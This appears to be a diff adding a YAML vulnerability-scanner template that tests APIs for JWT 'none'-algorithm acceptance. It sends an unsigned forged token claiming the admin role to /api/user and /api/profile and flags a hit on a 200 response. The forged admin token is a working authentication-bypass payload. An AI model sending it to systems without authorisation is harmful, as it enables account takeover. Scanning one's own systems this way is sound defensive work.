@@ -1,0 +1,27 @@
+id: shaheen-jwt-vuln
+info:
+  name: "JWT Vulnerabilities (None Algorithm / Weak Secret)"
+  author: Professor Snape
+  severity: critical
+  description: Detects JWT algorithm confusion and weak secret attacks
+  tags: jwt,auth,owasp-a02
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "user"
+          - "profile"
+        condition: or
